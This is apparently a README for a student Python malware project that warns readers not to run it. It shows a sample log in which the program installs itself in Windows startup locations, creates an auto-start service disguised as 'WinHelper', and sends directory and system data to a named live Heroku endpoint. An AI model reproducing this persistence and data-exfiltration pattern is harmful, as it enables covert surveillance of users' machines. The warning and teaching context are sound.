# Fluffy Paws

A project for Estonian IT College I719-Fundamentals-of-Python class.


# Important!
This is a Windows malware it will send your data to a live server.

Please don't use it!


# Information sent to server

    {"kind"=>"Log", "data"=>["2017-03-15 21:59:18 INFO Goliath On line...", "2017-03-15 21:59:19 DEBUG I'm already in (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup), skipping", "2017-03-15 21:59:19 DEBUG I'm already in (C:\\Windows\\system32\\config\\systemprofile\\Documents), skipping", "2017-03-15 21:59:19 DEBUG Launching a subprocess: \"sc create SuperAwesomeWindowsHelper\nbinPath= \"C:\\Windows\\system32\\config\\systemprofile\\Documents\\fluffypaws.exe\"\nDisplayName= \"WinHelper\"\nstart= auto\"", "2017-03-15 21:59:49 DEBUG Subprocess return code: None", "2017-03-15 21:59:49 INFO Subprocess finished", "2017-03-15 21:59:49 INFO Started dir info (C:\\Windows\\system32\\config\\systemprofile\\Documents)", "2017-03-15 21:59:51 INFO Finished dir info (C:\\Windows\\system32\\config\\systemprofile\\Documents)", "2017-03-15 21:59:51 DEBUG Rows of data (1)", "2017-03-15 21:59:51 DEBUG Sending data to (https://tranquil-caverns-83807.herokuapp.com/json)", "2017-03-15 21:59:52 DEBUG Json sent, response (200)", "2017-03-15 21:59:52 INFO Sending log to server", "2017-03-15 21:59:52 DEBUG End of loop, will wait for 3600 seconds"]}
    {"file_data"=>{"file_data"=>{"data"=>[{"files"=>[{"name"=>"desktop.ini", "stats"=>[33206, 281474976793944, 136187296, 1, 0, 0, 402, 1467218973, 1467218973, 1467218973]}, {"name"=>"fluffypaws.exe", "stats"=>[33279, 1407374883646712, 136187296, 1, 0, 0, 6514135, 1489607864, 1489607864, 1489607864]}], "folder"=>"C:\\Windows\\system32\\config\\systemprofile\\Documents"}], "kind"=>"User path data"}}, "ip"=>"1.1.1.1", "pc_data"=>{"data"=>{"Name"=>"erik-PC", "System"=>"Windows", "Version"=>"6.1.7601", "Machine"=>"x86", "Release"=>"7", "Processor"=>"x86 Family 6 Model 69 Stepping 1, GenuineIntel"}, "kind"=>"PC info"}}


# Instalation
Don't!
For testing purpuses use Windows virtual machine then clone this repo and run fluffypaws[dot]py in console.


To create binary [pyinstaller](https://pyinstaller.readthedocs.io) can be used.
